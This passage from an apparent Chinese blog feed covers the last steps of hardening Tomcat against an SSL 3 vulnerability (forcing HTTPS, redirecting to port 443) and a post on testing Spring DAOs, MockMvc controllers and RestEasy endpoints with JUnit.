    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-resource-name</span> <span class="token punctuation">&gt;</span></span>SSL<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-resource-name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-resource-collection</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user-data-constraint</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>transport-guarantee</span><span class="token punctuation">&gt;</span></span>CONFIDENTIAL<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>transport-guarantee</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user-data-constraint</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>security-constraint</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这步目的是让非ssl的connector跳转到ssl的connector去。所以还需要前往server.xml进行配置<code>80</code>端口跳转<code>443</code>：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Connector</span> <span class="token attr-name">port</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8080<span class="token punctuation">"</span></span> <span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTP/1.1<span class="token punctuation">"</span></span>
    <span class="token attr-name">connectionTimeout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20000<span class="token punctuation">"</span></span>
    <span class="token attr-name">redirectPort</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>443<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>由于tomcat对ssl的实现由两种方式，tomcat7默认实现是APR方式，所以这里我们要对server.xml再进行相关修改</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/789495-20161222005744761-894166255.png" alt="img"></p>
</li>
<li>
<p>重启Tomcat</p>
</li>
<li>
<p>本地进行<code>https:// 域名</code>测试，是否可正常访问</p>
</li>
<li>
<p>防火墙开放<code>443</code>端口出口访问</p>
</li>
<li>
<p>需要网络管理员进行内网端口映射</p>
<p>参考图：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2015010319370191.jpg" alt="img"></p>
</li>
<li>
<p>外网访问<code>https://域名</code> 测试，是否可正常访问</p>
</li>
<li>
<p>漏洞再次扫描：此时SSL 3 状态变更为关闭状态。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Junit日常使用记录</title>
    <url>/20221030/99356519.html</url>
    <content><![CDATA[<h1>使用Spring配合Junit进行单元测试的总结</h1>
<h2 id="jar包导入">jar包导入</h2>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.4.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="直接对spring中注入的bean进行测试-以DAO为例">直接对spring中注入的bean进行测试(以DAO为例)</h2>
<p>在测试类上添加</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RunWith</span> 注解指定使用springJunit的测试运行器
<span class="token annotation punctuation">@ContextConfiguration</span> 注解指定测试用的spring配置文件的位置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>之后我们就可以注入我们需要测试的bean进行测试。Junit在运行测试之前会先解析spring的配置文件,初始化spring中配置的bean</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringJUnit4ClassRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ContextConfiguration</span><span class="token punctuation">(</span>locations <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"classpath*:spring-config-test.xml"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestProjectDao</span> <span class="token punctuation">{</span>

  <span class="token annotation punctuation">@Autowired</span>
  <span class="token class-name">ProjectDao</span> projectDao<span class="token punctuation">;</span>

  <span class="token annotation punctuation">@Test</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testCreateProjectCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">long</span> applyTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Timestamp</span> ts <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Timestamp</span><span class="token punctuation">(</span>applyTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Map</span> codeMap <span class="token operator">=</span> projectDao<span class="token punctuation">.</span><span class="token function">generateCode</span><span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span> ts<span class="token punctuation">,</span> <span class="token string">"院内"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> projectCode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> codeMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"_project_code"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Timestamp</span> apply_time <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Timestamp</span><span class="token punctuation">)</span> codeMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"_apply_time"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>projectCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>apply_time<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">assertTrue</span><span class="token punctuation">(</span>projectCode<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="对SpringMVC进行测试">对SpringMVC进行测试</h2>
<p>Spring3.2之后出现了org.springframework.test.web.servlet.MockMvc 类,对springMVC单元测试进行支持。样例如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>jiaoyiping<span class="token punctuation">.</span>baseproject</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">MockMvcRequestBuilders</span><span class="token punctuation">.</span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>result<span class="token punctuation">.</span></span><span class="token class-name">MockMvcResultMatchers</span><span class="token punctuation">.</span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>jiaoyiping<span class="token punctuation">.</span>baseproject<span class="token punctuation">.</span>privilege<span class="token punctuation">.</span>controller<span class="token punctuation">.</span></span><span class="token class-name">MeunController</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>jiaoyiping<span class="token punctuation">.</span>baseproject<span class="token punctuation">.</span>training<span class="token punctuation">.</span>bean<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">junit<span class="token punctuation">.</span>framework<span class="token punctuation">.</span></span><span class="token class-name">Assert</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Before</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>runner<span class="token punctuation">.</span></span><span class="token class-name">RunWith</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">MediaType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ContextConfiguration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span>junit4<span class="token punctuation">.</span></span><span class="token class-name">SpringJUnit4ClassRunner</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">WebAppConfiguration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">MockMvc</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ResultActions</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>setup<span class="token punctuation">.</span></span><span class="token class-name">MockMvcBuilders</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringJUnit4ClassRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@WebAppConfiguration</span>
<span class="token comment">//@ContextConfiguration(classes = {WebMvcConfig.class, MockDataConfig.class})</span>
<span class="token annotation punctuation">@ContextConfiguration</span><span class="token punctuation">(</span>
  locations <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"classpath:/spring/applicationContext.xml"</span><span class="token punctuation">,</span>
    <span class="token string">"classpath*:mvc-dispatcher-servlet.xml"</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestMockMvc</span> <span class="token punctuation">{</span>

  <span class="token annotation punctuation">@Autowired</span>
  <span class="token keyword">private</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span>WebApplicationContext</span> context<span class="token punctuation">;</span>

  <span class="token class-name">MockMvc</span> mockMvc<span class="token punctuation">;</span>

  <span class="token annotation punctuation">@Before</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">//可以对所有的controller来进行测试</span>
    mockMvc <span class="token operator">=</span> <span class="token class-name">MockMvcBuilders</span><span class="token punctuation">.</span><span class="token function">webAppContextSetup</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//仅仅对单个Controller来进行测试</span>
    <span class="token comment">// mockMvc = MockMvcBuilders.standaloneSetup(new MeunController()).build();</span>
  <span class="token punctuation">}</span>

  <span class="token annotation punctuation">@Test</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testGetMenu</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"----------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">ResultActions</span> actions <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mockMvc<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/menu/manage.action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// System.out.println(content().toString());</span>
      actions<span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// actions.andExpect(content().contentType("text/html"));</span>
      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"----------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token comment">//从controller里直接增加用户(用POST的方式)</span>
  <span class="token comment">//post("路径").param("属性名","属性值"); 用这种方法来构造POST</span>
  <span class="token annotation punctuation">@Test</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addPerson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token class-name">ResultActions</span> resultActions <span class="token operator">=</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>mockMvc<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span>
            <span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/person/add"</span><span class="token punctuation">)</span>
              <span class="token punctuation">.</span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"用友软件"</span><span class="token punctuation">)</span>
              <span class="token punctuation">.</span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">)</span>
              <span class="token punctuation">.</span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string">"address"</span><span class="token punctuation">,</span> <span class="token string">"北京市永丰屯"</span><span class="token punctuation">)</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
      resultActions<span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token comment">//得到Controller层返回的ModelAndView的方法：resultActions.andReturn().getModelAndView().getModel().get("person");</span>
  <span class="token annotation punctuation">@Test</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getPerson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">String</span> id <span class="token operator">=</span> <span class="token string">"297e5fb648b0e6d30148b0e6da6d0000"</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token class-name">ResultActions</span> resultActions <span class="token operator">=</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>mockMvc<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/person/toEditPerson"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span>
          <span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>
        resultActions<span class="token punctuation">.</span><span class="token function">andReturn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getModelAndView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"person"</span><span class="token punctuation">)</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> person<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span><span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> person<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="测试RestEasy提供的接口-当使用restEasy提供的rest类型接口的时候会用到">测试RestEasy提供的接口(当使用restEasy提供的rest类型接口的时候会用到)</h2>
<p>RestEasy提供了 org.jboss.resteasy.core.Dispatcher类来模拟http请求，并返回数据。这样,在测试接口的时候就不必启动容器了<br>
代码如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>cmri<span class="token punctuation">.</span>pds<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>cmri<span class="token punctuation">.</span>pds<span class="token punctuation">.</span>project<span class="token punctuation">.</span>controllor<span class="token punctuation">.</span></span><span class="token class-name">ProjectTagControllor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>cmri<span class="token punctuation">.</span>pds<span class="token punctuation">.</span>project<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">ProjectTagService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URISyntaxException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>jboss<span class="token punctuation">.</span>resteasy<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">Dispatcher</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>jboss<span class="token punctuation">.</span>resteasy<span class="token punctuation">.</span>mock<span class="token punctuation">.</span></span><span class="token class-name">MockDispatcherFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>jboss<span class="token punctuation">.</span>resteasy<span class="token punctuation">.</span>mock<span class="token punctuation">.</span></span><span class="token class-name">MockHttpRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>jboss<span class="token punctuation">.</span>resteasy<span class="token punctuation">.</span>mock<span class="token punctuation">.</span></span><span class="token class-name">MockHttpResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Assert</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Before</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>runner<span class="token punctuation">.</span></span><span class="token class-name">RunWith</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ContextConfiguration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span>junit4<span class="token punctuation">.</span></span><span class="token class-name">SpringJUnit4ClassRunner</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringJUnit4ClassRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ContextConfiguration</span><span class="token punctuation">(</span>locations <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"classpath*:spring-config-test.xml"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
